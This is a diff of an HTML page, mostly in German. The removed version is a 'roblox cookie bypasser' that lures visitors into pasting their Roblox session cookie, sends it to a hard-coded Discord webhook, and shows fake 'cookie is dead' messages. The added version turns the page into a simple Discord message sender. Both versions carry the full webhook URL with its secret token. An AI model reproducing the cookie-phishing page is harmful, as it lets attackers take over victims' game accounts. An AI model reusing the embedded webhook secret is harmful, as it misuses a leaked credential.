@@ -2,12 +2,8 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <title>roblox bypasser</title>
+  <title>Discord Webhook Sender</title>
   <style>
-    /* ==== Base Styling ==== */
-    * {
-      box-sizing: border-box;
-    }
     body {
       font-family: "Segoe UI", sans-serif;
       background: linear-gradient(135deg, #141e30, #243b55);
@@ -21,129 +17,80 @@
     .container {
       background: rgba(47, 49, 54, 0.95);
       padding: 30px;
-      border-radius: 20px;
-      width: 540px;
-      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6),
-                  0 0 30px rgba(88, 101, 242, 0.4);
-      animation: fadeIn 0.7s ease-in-out;
-      border: 2px solid transparent;
-      background-image: linear-gradient(135deg, #2f3136, #23272a),
-                        linear-gradient(135deg, #5865f2, #43b581);
-      background-origin: border-box;
-      background-clip: padding-box, border-box;
-    }
-    @keyframes fadeIn {
-      from {opacity: 0; transform: scale(0.95);}
-      to {opacity: 1; transform: scale(1);}
+      border-radius: 16px;
+      width: 500px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6),
+                  0 0 30px rgba(88,101,242,0.4);
     }
     h2 {
       text-align: center;
       margin-bottom: 20px;
-      font-size: 26px;
       color: #7289da;
-      letter-spacing: 1px;
-      text-shadow: 0 0 8px #5865f299;
     }
-
-    /* ==== Option Buttons ==== */
     .options {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
-      gap: 14px;
-      margin-bottom: 22px;
+      gap: 12px;
+      margin-bottom: 18px;
     }
     .option {
       background: #4f545c;
-      padding: 18px;
-      border-radius: 14px;
+      padding: 14px;
+      border-radius: 12px;
       text-align: center;
       cursor: pointer;
-      transition: all 0.25s ease;
+      transition: all 0.2s ease;
       font-size: 22px;
-      font-weight: bold;
-      user-select: none;
-      border: 2px solid transparent;
     }
-    .option:hover {
-      background: #5865f2;
-      transform: translateY(-3px) scale(1.05);
-      box-shadow: 0 0 12px #5865f299;
-    }
-    .option.active {
-      background: #43b581;
-      border-color: #2ecc71;
-      box-shadow: 0 0 18px #2ecc71cc;
-      transform: scale(1.1);
-    }
-
-    /* ==== Textbox ==== */
+    .option:hover { background: #5865f2; }
+    .option.active { background: #43b581; }
     textarea {
       width: 100%;
-      height: 180px;
-      padding: 14px;
-      border-radius: 14px;
-      border: 2px solid transparent;
+      height: 140px;
+      padding: 12px;
+      border-radius: 12px;
+      border: none;
       resize: none;
-      margin-bottom: 22px;
+      margin-bottom: 18px;
       font-size: 15px;
       background: #202225;
       color: white;
-      outline: none;
-      transition: all 0.25s ease;
-      background-image: linear-gradient(#202225, #2c2f33),
-                        linear-gradient(135deg, #5865f2, #43b581);
-      background-origin: border-box;
-      background-clip: padding-box, border-box;
     }
-    textarea:focus {
-      box-shadow: 0 0 12px #5865f299;
-      border-color: transparent;
-    }
-
-    /* ==== Button ==== */
     button {
       width: 100%;
-      padding: 16px;
+      padding: 14px;
       border: none;
-      border-radius: 14px;
+      border-radius: 12px;
       background: linear-gradient(135deg, #5865f2, #4752c4);
       color: white;
-      font-size: 17px;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      transition: all 0.25s ease;
-      box-shadow: 0 0 12px rgba(0,0,0,0.4);
+      transition: 0.2s;
     }
-    button:hover {
-      background: linear-gradient(135deg, #6d7ff7, #5865f2);
-      transform: translateY(-3px);
-      box-shadow: 0 6px 20px rgba(88,101,242,0.5);
-    }
-    button:active {
-      transform: scale(0.97);
-    }
+    button:hover { background: linear-gradient(135deg, #6d7ff7, #5865f2); }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>roblox cookie bypasser</h2>
+    <h2>Discord Webhook Sender</h2>
     <div class="options" id="options">
-      <div class="option">email bypass [all ages]</div>
-      <div class="option">+13 to -13 All ages</div>
-      <div class="option">acc deleter [works on all accs]</div>
-      <div class="option">coming soon..</div>
+      <div class="option">🔥</div>
+      <div class="option">💎</div>
+      <div class="option">⚡</div>
+      <div class="option">🌙</div>
     </div>
-    <textarea id="message" placeholder="paste the cookie"></textarea>
-    <button id="sendBtn">▶️ Start</button>
+    <textarea id="message" placeholder="Deine Nachricht..."></textarea>
+    <button id="sendBtn">Nachricht senden</button>
   </div>
 
   <script>
-    const webhookUrl = "const webhookUrl = "const webhookUrl = "https://discord.com/api/webhooks/1406365019876098069/WoeaQe2sgZxw6Njum0MqjnsW5x0L7ulRezoRYqrvNbpb94YZCCUfLBsfKwCRbhZfHfuz";
-";
-"; // <-- deine URL hier
+    // 👇 Hier deine Webhook-URL einfügen
+    const webhookUrl = "https://discord.com/api/webhooks/1406365019876098069/WoeaQe2sgZxw6Njum0MqjnsW5x0L7ulRezoRYqrvNbpb94YZCCUfLBsfKwCRbhZfHfuz";
+
     let selectedOption = null;
 
-    // Option auswählen
+    // Option anklicken
     document.querySelectorAll(".option").forEach(opt => {
       opt.addEventListener("click", () => {
         document.querySelectorAll(".option").forEach(o => o.classList.remove("active"));
@@ -154,14 +101,14 @@
 
     // Nachricht senden
     document.getElementById("sendBtn").addEventListener("click", async () => {
-      const msg = document.getElementById("message").value;
+      const msg = document.getElementById("message").value.trim();
 
       if (!msg) {
-        alert("❌ Paste the cookie");
+        alert("❌ Bitte gib eine Nachricht ein!");
         return;
       }
       if (!selectedOption) {
-        alert("❌ wrong details");
+        alert("❌ Bitte wähle ein Symbol!");
         return;
       }
 
@@ -169,20 +116,21 @@
         const response = await fetch(webhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `${selectedOption} ${msg}`
-          }),
+          body: JSON.stringify({ content: `${selectedOption} ${msg}` }),
         });
 
         if (!response.ok) throw new Error("HTTP " + response.status);
-        alert("cookie is dead");
+        alert("✅ Nachricht gesendet!");
+        document.getElementById("message").value = "";
       } catch (err) {
-        alert("COOKIE IS DEAD " + err.message + "\n\nTipp: COOKIE IS DEAD");
+        alert("⚠️ Fehler beim Senden: " + err.message + 
+              "\nTipp: Öffne die Datei über einen Webserver (nicht per file://).");
       }
     });
   </script>
 </body>
 </html>
+
 
 
 
